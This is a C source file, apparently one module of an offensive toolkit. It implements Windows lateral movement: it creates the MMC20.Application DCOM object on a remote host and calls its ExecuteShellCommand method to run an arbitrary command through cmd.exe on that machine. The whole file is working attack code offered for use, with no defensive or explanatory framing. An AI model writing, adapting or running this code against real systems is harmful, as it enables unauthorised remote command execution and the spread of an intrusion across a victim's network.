// chunk: lateral/dcom_mmc
// depends: (none)
// provides: lateral_dcom_mmc
// headers: windows.h, objbase.h
// libs: ole32, oleaut32
// note: Lateral movement via MMC20.Application DCOM

#ifndef CHUNK_LATERAL_DCOM_MMC
#define CHUNK_LATERAL_DCOM_MMC

static int lateral_dcom_mmc(const char *target_host, const char *command) {
    HRESULT hr;
    IDispatch *pDisp = NULL;
    int result = 0;

    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        return 0;
    }

    CLSID clsid;
    hr = CLSIDFromProgID(L"MMC20.Application", &clsid);
    if (FAILED(hr)) {
        CoUninitialize();
        return 0;
    }

    wchar_t wtarget[256];
    MultiByteToWideChar(CP_UTF8, 0, target_host, -1, wtarget, 256);

    COSERVERINFO serverInfo = {0};
    serverInfo.pwszName = wtarget;

    MULTI_QI mqi = {0};
    mqi.pIID = &IID_IDispatch;

    hr = CoCreateInstanceEx(&clsid, NULL, CLSCTX_REMOTE_SERVER,
                            &serverInfo, 1, &mqi);
    if (FAILED(hr) || FAILED(mqi.hr)) {
        CoUninitialize();
        return 0;
    }

    pDisp = (IDispatch *)mqi.pItf;

    DISPID dispidDocument;
    OLECHAR *szDocument = L"Document";
    hr = pDisp->lpVtbl->GetIDsOfNames(pDisp, &IID_NULL, &szDocument, 1,
                                       LOCALE_USER_DEFAULT, &dispidDocument);
    if (SUCCEEDED(hr)) {
        DISPPARAMS dpNoArgs = {NULL, NULL, 0, 0};
        VARIANT varDoc;
        VariantInit(&varDoc);

        hr = pDisp->lpVtbl->Invoke(pDisp, dispidDocument, &IID_NULL,
                                    LOCALE_USER_DEFAULT, DISPATCH_PROPERTYGET,
                                    &dpNoArgs, &varDoc, NULL, NULL);

        if (SUCCEEDED(hr) && varDoc.vt == VT_DISPATCH && varDoc.pdispVal) {
            IDispatch *pDoc = varDoc.pdispVal;

            DISPID dispidActiveView;
            OLECHAR *szActiveView = L"ActiveView";
            hr = pDoc->lpVtbl->GetIDsOfNames(pDoc, &IID_NULL, &szActiveView, 1,
                                              LOCALE_USER_DEFAULT, &dispidActiveView);
            if (SUCCEEDED(hr)) {
                VARIANT varView;
                VariantInit(&varView);
                hr = pDoc->lpVtbl->Invoke(pDoc, dispidActiveView, &IID_NULL,
                                           LOCALE_USER_DEFAULT, DISPATCH_PROPERTYGET,
                                           &dpNoArgs, &varView, NULL, NULL);

                if (SUCCEEDED(hr) && varView.vt == VT_DISPATCH && varView.pdispVal) {
                    IDispatch *pView = varView.pdispVal;

                    DISPID dispidExecShell;
                    OLECHAR *szExecShell = L"ExecuteShellCommand";
                    hr = pView->lpVtbl->GetIDsOfNames(pView, &IID_NULL, &szExecShell, 1,
                                                       LOCALE_USER_DEFAULT, &dispidExecShell);
                    if (SUCCEEDED(hr)) {
                        wchar_t wcmd[1024];
                        MultiByteToWideChar(CP_UTF8, 0, command, -1, wcmd, 1024);

                        VARIANT args[4];
                        VariantInit(&args[3]);
                        args[3].vt = VT_BSTR;
                        args[3].bstrVal = SysAllocString(L"cmd.exe");

                        VariantInit(&args[2]);
                        args[2].vt = VT_BSTR;
                        args[2].bstrVal = SysAllocString(L"");

                        VariantInit(&args[1]);
                        args[1].vt = VT_BSTR;
                        wchar_t wargs[1024];
                        swprintf(wargs, 1024, L"/c %s", wcmd);
                        args[1].bstrVal = SysAllocString(wargs);

                        VariantInit(&args[0]);
                        args[0].vt = VT_BSTR;
                        args[0].bstrVal = SysAllocString(L"7");

                        DISPPARAMS dp = {args, NULL, 4, 0};
                        hr = pView->lpVtbl->Invoke(pView, dispidExecShell, &IID_NULL,
                                                    LOCALE_USER_DEFAULT, DISPATCH_METHOD,
                                                    &dp, NULL, NULL, NULL);

                        result = SUCCEEDED(hr) ? 1 : 0;

                        VariantClear(&args[0]);
                        VariantClear(&args[1]);
                        VariantClear(&args[2]);
                        VariantClear(&args[3]);
                    }
                    pView->lpVtbl->Release(pView);
                }
                VariantClear(&varView);
            }
            pDoc->lpVtbl->Release(pDoc);
        }
        VariantClear(&varDoc);
    }

    pDisp->lpVtbl->Release(pDisp);
    CoUninitialize();

    return result;
}

#endif
